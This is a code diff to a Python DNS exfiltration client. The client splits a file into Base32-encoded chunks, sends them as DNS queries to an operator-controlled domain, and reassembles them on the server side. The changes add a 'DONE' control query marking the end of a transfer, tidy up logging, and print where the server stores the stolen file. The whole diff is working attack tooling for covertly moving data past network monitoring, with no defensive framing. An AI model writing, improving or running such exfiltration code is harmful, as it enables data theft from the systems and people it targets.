@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import argparse
+import logging
 import os
 import random
 import time
@@ -82,7 +83,8 @@ class DNSExfiltrationClient:
                 try:
                     resolved = dns.resolver.resolve(ns, 'A')
                     resolved_nameservers.extend([str(r) for r in resolved])
-                except:
+                except Exception as e:
+                    self.logger.debug(f"Could not resolve {ns} as A: {e}")
                     resolved_nameservers.append(ns)
             
             self.resolver.nameservers = resolved_nameservers
@@ -272,6 +274,30 @@ class DNSExfiltrationClient:
 
         return False
 
+    def send_done(self, total_chunks: int, domain: str) -> bool:
+        """
+        Send DONE control query so server knows transfer is complete.
+        Label format: <session>-DONE-<total_chunks> (e.g. JKD3BR-DONE-0042).
+        """
+        if not self.session_id:
+            return False
+        total_str = str(total_chunks).zfill(4)
+        label = f"{self.session_id}-DONE-{total_str}"
+        query_name = f"{label}.{domain}"
+        if len(label) > self._DNS_LABEL_MAX_LEN:
+            self.logger.error("DONE label too long")
+            return False
+        try:
+            self.resolver.resolve(query_name, "A")
+            self.logger.info(f"Sent DONE (total chunks: {total_chunks})")
+            return True
+        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
+            self.logger.info("Sent DONE (NXDOMAIN/NoAnswer)")
+            return True
+        except Exception as e:
+            self.logger.warning(f"DONE query failed: {e}")
+            return False
+
     def exfiltrate_file(self, file_path: str, domain: str) -> bool:
         """
         Exfiltrate a file through DNS queries using Base32 encoding.
@@ -316,7 +342,13 @@ class DNSExfiltrationClient:
                 f"Exfiltration complete. Success rate: {success_rate:.2f}% "
                 f"({success_count}/{len(chunks)} chunks)"
             )
-            
+            if success_count == len(chunks):
+                self.send_done(len(chunks), domain)
+                if self.session_id:
+                    self.logger.info(
+                        f"Session ID: {self.session_id}. "
+                        f"On server, look for output file named {self.session_id}_*.bin in the output directory."
+                    )
             if failed_chunks:
                 self.logger.warning(f"Failed chunks: {failed_chunks}")
 
@@ -364,13 +396,11 @@ def parse_args():
 
 def main():
     """Main function to run the DNS exfiltration client."""
+    logger = None
     try:
-        args = parse_args()
-        
-        # Setup logging
+        # Setup logging first so it's always available in except
         logger = setup_logger()
-        
-        # Load configuration
+        args = parse_args()
         config = load_config(args.config)
         
         # Create client
@@ -388,7 +418,10 @@ def main():
             exit(1)
             
     except Exception as e:
-        logger.error(f"Fatal error: {e}")
+        if logger is not None:
+            logger.error(f"Fatal error: {e}")
+        else:
+            logging.getLogger("DNSExfiltration").error(f"Fatal error: {e}")
         exit(1)
 
 if __name__ == "__main__":
